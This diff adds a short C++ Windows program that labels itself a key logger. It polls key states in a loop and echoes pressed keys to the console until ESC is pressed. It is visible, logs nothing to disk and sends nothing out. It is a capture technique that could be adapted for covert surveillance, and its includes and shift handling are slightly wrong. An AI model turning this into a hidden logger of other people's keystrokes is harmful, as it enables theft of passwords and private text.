@@ -1,0 +1,32 @@
+#include <iostream>
+#include <windows.h>
+
+int main() {
+    std::cout << "Key Logger Running (Windows). Press ESC to quit.\n";
+
+    while (!(GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
+        std::this_thread::sleep_for(std::chrono::milliseconds(1));
+        
+        for (int key = 8; key <= 190; key++) {
+            if (GetAsyncKeyState(key) & 0x8000) {
+                // Key pressed, log it
+                if (key >= 'A' && key <= 'Z') {
+                    // Check if SHIFT is also pressed for uppercase
+                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
+                        std::cout << (char)key;
+                    } else {
+                        std::cout << (char)tolower(key);
+                    }
+                } else if (key == VK_SPACE) {
+                    std::cout << "[SPACE]";
+                } else if (key == VK_RETURN) {
+                    std::cout << "[ENTER]\n";
+                }
+                // Sleep briefly to prevent logging the same key multiple times
+                std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            }
+        }
+    }
+    std::cout << "\nExiting Key Logger.\n";
+    return 0;
+}
